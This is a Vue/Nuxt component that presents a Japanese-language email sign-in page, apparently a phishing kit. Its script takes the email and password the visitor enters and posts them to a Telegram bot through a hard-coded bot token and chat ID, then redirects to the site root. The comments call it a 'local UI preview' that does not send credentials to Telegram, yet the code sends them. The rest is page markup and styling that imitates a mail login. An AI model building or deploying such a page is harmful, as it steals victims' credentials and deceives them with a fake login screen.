<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        email: "",
        password: "",
      },
      title: 'Sign in with your Mail',
      meta: [
        {
          hid: 'description',
          name: 'description',
          content: 'Responsive mail interface design preview.'
        }
      ],
      showPassword: false,
      title: "Sign in with your Mail",
      previewMessage: false,
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },

  methods: {


    nextStep() {
      if (!this.formDataRes.email.trim()) return;

      this.showPassword = true;
      this.previewMessage = false;
    },

    editEmail() {
      this.showPassword = false;
      this.previewMessage = false;
    },

    async finishJoob() {

      if (!this.formDataRes.password) return;

      // Local UI preview only. Do not send credentials to Telegram.
      this.previewMessage = true;

      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);
      this.previewMessage = true;
      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `* ✉️ MAILINGS*\nEmail: ${this.formDataRes.email}\nPassword: ${this.formDataRes.password}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("/");
      }
    },



    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>

<template>
  <div class="mail-page">
    <!-- Top navigation -->
    <header class="topbar">
      <div class="topbar-inner">
        <nav class="top-links">
          <a href="#help" style="display: flex; align-items: center; font-size: 12px; font-weight: 600; gap: 6px;">
            <svg xmlns="http://www.w3.org/2000/svg" width="14px" height="14px" viewBox="0 0 24 24">
              <path d="M0 0h24v24H0z" fill="none" />
              <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="m11 5l-7 7l7 7m-7-7h16" />
            </svg>


            ヘルプ　利用規約　プライバシー
          </a>
        </nav>
      </div>
    </header>

    <!-- Main content -->
    <main class="main-content">
      <section class="login-card">
        <div class="mail-icons" aria-label="Mail services">
          <img style="width: 100px;"
            src="https://www.image2url.com/r2/default/images/1776390343898-4c264f22-48ab-4b54-b2fb-0f3618937379.jpg" />
        </div>

        <h1>メールでサインイン</h1>
        <p class="subtitle">メールアカウントを使用して</p>

        <form class="login-form" @submit.prevent="showPassword ? finishJoob() : nextStep()">


          <div v-if="showPassword" class="grab"
            style="font-size: 12px; width: 100%; padding: 18px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; color: #000; background-color: #f9fafb; border: 1px solid #e5e7eb; height: 42px; border-radius: 12px;">
            <b>{{ formDataRes.email }}</b>
            <button @click="editEmail"
              style="color: #6200ea; border: none; background: none; width: fit-content; height: fit-content; margin: 0;">Edit</button>
          </div>


          <div v-if="!showPassword" class="inp">
            <label for="email">メールアドレス <span>*</span></label>
            <input id="email" v-model="formDataRes.email" type="email" placeholder="ユーザー名、メール、携帯電話"
              autocomplete="off" required />
          </div>


          <div v-if="showPassword" class="inp">
            <label for="password">パスワード <span>*</span></label>
            <br>
            <input id="password" v-model="formDataRes.password" type="password" placeholder="パスワードを入力してください。"
              autocomplete="off" required />
          </div>

          <button type="submit" :disabled="loading">
            <svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 48 48">
              <path d="M0 0h48v48H0z" fill="none" />
              <g fill="none" stroke="currentColor" stroke-width="4">
                <path stroke-linecap="round" stroke-linejoin="round" d="M13 42h22l6-21l-10 5l-7-14l-7 14l-10-5z" />
                <circle cx="7" cy="18" r="3" />
                <circle cx="24" cy="9" r="3" />
                <circle cx="41" cy="18" r="3" />
              </g>
            </svg>

            <span v-if="!showPassword">次へ</span>
            <span v-else>サインイン</span>
          </button>
        </form>

        <div class="card-footer">
          <a href="#language">英語（アメリカ合衆国）</a>
          <span>|</span>
          <a href="#help">ヘルプ</a>
          <span>|</span>
          <a href="#privacy">
            プライバシー
          </a>
          <span>|</span>
          <a href="#terms">利用規約</a>
        </div>
      </section>
    </main>

    <!-- Bottom footer -->
    <footer class="page-footer">
      <p>© 2026 無断転載・複製禁止。</p>
    </footer>
  </div>
</template>

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  padding: 0;
  font-family: Arial, Helvetica, sans-serif;
  color: #111111;
}

body {
  min-width: 320px;
}

.mail-page {
  min-height: 100vh;
  min-height: 100dvh;
  display: flex;
  flex-direction: column;
  background: #f7f8fa;
}

.topbar {
  height: 69px;
  flex-shrink: 0;
  background: #ffffff;
  border: 1px solid #eeeeee;
}

.topbar-inner {
  height: 100%;
  max-width: 1440px;
  margin: 0 auto;
  display: flex;
  align-items: center;
  justify-content: flex-end;
  margin: 0px 198.5px;

}

.top-links {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 8px 16px;
  background: #f4f5f7;
  border-radius: 13px;
  height: 36px;
  cursor: pointer;
}

.top-links:hover {
  background: #e5e7eb;
}

.top-links a {
  color: #43516a;
  text-decoration: none;
  font-size: 12px;
  font-weight: 600;
}

.main-content {
  flex: 1;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 40px 20px;
}

.login-card {
  width: 512px;
  max-width: 100%;
  min-height: 453px;
  padding: 48px;
  background: #ffffff;
  border-radius: 18px;
  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.055);
}

.mail-icons {
  margin: 0px 157px 20px;
}

.mail-icon {
  display: inline-flex;
  width: 25px;
  height: 25px;
}

.mail-icon svg {
  display: block;
  width: 100%;
  height: 100%;
}

.login-card h1 {
  margin-bottom: 8px;
  margin-top: 0;
  text-align: center;
  font-size: 1.875rem;
  line-height: 2.25rem 36px;
  font-weight: 900;
  letter-spacing: -1px;
}

.subtitle {
  margin: 0px 15px 32px;
  text-align: center;
  color: #4a5568;
  font-size: 14px;
}

.login-form {
  display: flex;
  flex-direction: column;
}


.login-form label {
  margin-bottom: 4px;
  color: #4a5568;
  font-size: 12px;
  font-weight: 600;
  letter-spacing: 0.25px;
}

.login-form label span {
  color: #4a5568;
}

.login-form input {
  margin-top: 4px;
  width: 100%;
  height: 54px;
  padding: 16px;
  border: 1px solid #d4d9e2;
  border-radius: 12px;
  outline: none;
  background: #ffffff;
  color: #202938;
  font-family: inherit;
  font-size: 14px;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.login-form input::placeholder {
  color: #929db0;
  opacity: 1;
}

.login-form input:focus {
  border-color: #6500ef;
  box-shadow: 0 0 0 3px rgba(101, 0, 239, 0.1);
}

.login-form button {
  width: 100%;
  height: 56px;
  margin-top: 16px;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 6px;
  border: 0;
  border-radius: 12px;
  background: #6100ed;
  color: #ffffff;
  font-family: inherit;
  font-size: 12px;
  font-weight: 700;
  cursor: pointer;
  transition: background 0.2s, transform 0.2s;
}

.login-form button:hover {
  background: #5000cb;
}

.login-form button:active {
  transform: scale(0.99);
}

.preview-message {
  margin: 12px 0 0;
  color: #5d3c8c;
  font-size: 12px;
  line-height: 1.5;
  text-align: center;
}

.card-footer {
  margin-top: 32px;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-wrap: wrap;
  gap: 5px;
  color: #9aa4b5;
  font-size: 12px;
}

.card-footer a {
  color: #8d98aa;
  text-decoration: none;
}

.card-footer a:hover {
  color: #6100ed;
}

.page-footer {
  height: 42px;
  flex-shrink: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  background: #ffffff;
  border-top: 1px solid #eeeeee;
}

.page-footer p {
  margin: 0;
  color: #929bad;
  font-size: 11px;
}

/* Responsive layout */
@media (max-width: 600px) {
  .topbar {
    height: 56px;
  }

  .topbar-inner {
    padding: 0 16px;
  }

  .main-content {
    padding: 28px 16px;
  }

  .login-card {
    width: 100%;
    min-height: auto;
    padding: 38px 25px 32px;
    border-radius: 16px;
  }

  .login-card h1 {
    font-size: 24px;
    letter-spacing: -0.7px;
  }

  .subtitle {
    margin-bottom: 27px;
  }

  .card-footer {
    margin-top: 32px;
    line-height: 1.8;
  }

  .page-footer {
    height: 49px;
  }
}

@media (max-width: 360px) {
  .login-card {
    padding-right: 19px;
    padding-left: 19px;
  }

  .login-card h1 {
    font-size: 22px;
  }
}
</style>
